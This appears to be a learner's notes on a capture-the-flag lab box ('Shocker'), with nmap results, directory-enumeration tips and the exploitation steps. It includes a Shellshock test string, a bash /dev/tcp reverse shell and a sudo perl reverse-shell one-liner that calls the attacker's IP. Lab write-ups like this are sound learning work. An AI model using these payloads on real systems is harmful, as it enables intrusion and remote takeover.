80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html)

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)


What I learned
- If you know its a web service/framework look for common files
- If gobuster is finding nothing about a website, they might be doing something to prevent it, or hiding it at best
- requests to directories without a trailing slash are just redirected with a trailing slash
- dirbuster willl send two requests, with and without that trailing slash
- gobuster does not, but the flag -f will add that trailing slash

- You need to really learn about the service/protocol and some of the nuances
- Maybe look at installing the service to learn more about it??
- Also when dealing with apache, its common to look for scripts in the cgi-bin folder
- Should prob run gobuster with -f option from now on
- when attacking directories, try over adding extensions than under adding, also make sure you know which extension it will most likely be

cgi-bin we go ahead and test shell shock "also because the box is called shocker"
test for shell shock using the string `() { :; }; sleep 10`
which gives us an internal server error which is pretty sus
`/bin/sh -i >& /dev/tcp/10.10.14.146/6000 0>&1`

Look for ssh configurations in /etc/ssh/sshd_config
sudo -l shows we can execute perl as sudo
lets try a reverse shell with perl
`sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.146";$p=6001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

Look at guides on how I shouldve upgraded to a TTY shell and how everyone else did things

Shouldve thought to look for SUID, also couldve tried to start a server and serve linpeas from it

Things to do:
Should look more into shell shock and why this vulnerability exists, as well as how to find it on the server
- honestly if the extension is .sh you should check for shell shock
